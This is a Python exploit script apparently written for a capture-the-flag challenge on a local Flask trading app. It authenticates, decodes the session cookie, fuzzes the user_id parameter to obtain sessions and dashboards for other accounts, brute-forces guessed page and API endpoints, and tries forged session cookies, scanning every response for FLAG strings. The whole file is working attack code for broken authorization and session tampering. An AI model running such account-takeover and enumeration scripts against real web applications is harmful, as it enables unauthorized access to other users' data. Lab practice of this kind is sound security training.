import requests
import re
import base64

# Target configuration
base_url = "http://127.0.0.1:32933"

print("[+] Exploring alternative authenticated endpoints and techniques")
print(f"[+] Target: {base_url}")

# Create session for cookie persistence
session = requests.Session()

# Step 1 and 2: Authenticate
step1_headers = {'Content-Type': 'application/x-www-form-urlencoded'}
step1_data = {'username': 'test'}
session.post(f"{base_url}/", headers=step1_headers, data=step1_data)

step2_headers = {'Content-Type': 'application/x-www-form-urlencoded'}
step2_data = {'username': 'test', 'user_id': '10032', 'password': 'test'}
resp2 = session.post(f"{base_url}/password/test", headers=step2_headers, data=step2_data, allow_redirects=False)

# Extract session cookie
set_cookie = resp2.headers.get('Set-Cookie', '')
session_match = re.search(r'session=([^;]+)', set_cookie)
if session_match:
    session.cookies.set('session', session_match.group(1))

print(f"[+] Authenticated with session: {session.cookies.get('session', 'None')}")

# Decode the session cookie (Flask format: payload.timestamp.signature)
session_cookie = session.cookies.get('session', '')
if session_cookie:
    try:
        parts = session_cookie.split('.')
        if len(parts) >= 1:
            # Decode base64 payload
            payload = parts[0]
            # Add padding if needed
            padding = 4 - len(payload) % 4
            if padding != 4:
                payload += '=' * padding
            decoded = base64.urlsafe_b64decode(payload)
            print(f"[+] Decoded session payload: {decoded}")
    except Exception as e:
        print(f"[+] Session decode error: {e}")

# Try fuzzing user IDs to see if others work
print("\n" + "="*60)
print("FUZZING USER IDs")
print("="*60)

for uid in range(10030, 10040):
    test_session = requests.Session()
    test_session.post(f"{base_url}/", headers=step1_headers, data={'username': 'test'})
    
    resp = test_session.post(f"{base_url}/password/test", 
                             headers=step2_headers, 
                             data={'username': 'test', 'user_id': str(uid), 'password': 'test'},
                             allow_redirects=False)
    
    if 'Set-Cookie' in resp.headers:
        sc = resp.headers.get('Set-Cookie', '')
        sm = re.search(r'session=([^;]+)', sc)
        if sm:
            test_session.cookies.set('session', sm.group(1))
            
            # Try dashboard with this session
            dash = test_session.get(f"{base_url}/dashboard")
            print(f"[+] user_id={uid}: Dashboard status={dash.status_code}, Length={len(dash.content)}")
            
            if dash.status_code == 200 and len(dash.content) > 500:
                print(f"[+] Interesting dashboard for user_id={uid}!")
                print(f"[+] Content: {dash.text[:1000]}")
                
                # Search for flags
                flags = re.findall(r'FLAG\{[^}]+\}', dash.text)
                if flags:
                    print(f"[!] FLAG FOUND: {flags}")
    else:
        print(f"[-] user_id={uid}: No session cookie set")

# Try different endpoints that might exist
print("\n" + "="*60)
print("TESTING ALTERNATIVE ENDPOINTS")
print("="*60)

endpoints = [
    '/profile',
    '/user',
    '/settings',
    '/balance',
    '/home',
    '/main',
    '/trade',
    '/portfolio',
    '/transactions',
    '/history',
    '/watchlist',
    '/positions'
]

for endpoint in endpoints:
    resp = session.get(f"{base_url}{endpoint}")
    if resp.status_code != 404:
        print(f"[+] {endpoint}: Status={resp.status_code}, Length={len(resp.content)}")
        
        # Search for flags
        flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
        if flags:
            print(f"[!] FLAG FOUND at {endpoint}: {flags}")
        
        # If interesting content, show preview
        if resp.status_code == 200 and len(resp.content) > 500:
            print(f"[+] Content preview:\n{resp.text[:500]}")

# Try with different cookies/session manipulation
print("\n" + "="*60)
print("SESSION MANIPULATION TESTS")
print("="*60)

# Try accessing with a modified session (if we can decode it)
if session_cookie:
    try:
        # Try to check if there are other users accessible
        test_uid = 10031
        fake_payload = f'{{"user_id":{test_uid}}}'.encode()
        fake_b64 = base64.urlsafe_b64encode(fake_payload).decode().rstrip('=')
        print(f"[+] Test payload for user_id={test_uid}: {fake_b64}")
        
        # Try the modified session (won't work without knowing the secret key)
        fake_session = f"{fake_b64}.invalid.invalid"
        fake_sess = requests.Session()
        fake_sess.cookies.set('session', fake_session)
        
        resp = fake_sess.get(f"{base_url}/dashboard")
        print(f"[+] Fake session result: {resp.status_code}")
        
    except Exception as e:
        print(f"[+] Session manipulation error: {e}")

# Check if there's a direct API endpoint
print("\n" + "="*60)
print("API ENDPOINT TESTS")
print("="*60)

api_endpoints = [
    '/api/dashboard',
    '/api/user',
    '/api/data',
    '/api/balance',
    '/api/trades',
    '/api/orders'
]

for endpoint in api_endpoints:
    resp = session.get(f"{base_url}{endpoint}")
    if resp.status_code != 404:
        print(f"[+] {endpoint}: Status={resp.status_code}")
        print(f"[+] Response: {resp.text[:500]}")
        
        flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
        if flags:
            print(f"[!] FLAG FOUND: {flags}")

print("\n[+] Exploration completed")
print(f"[+] Final session cookie: {session_cookie}")

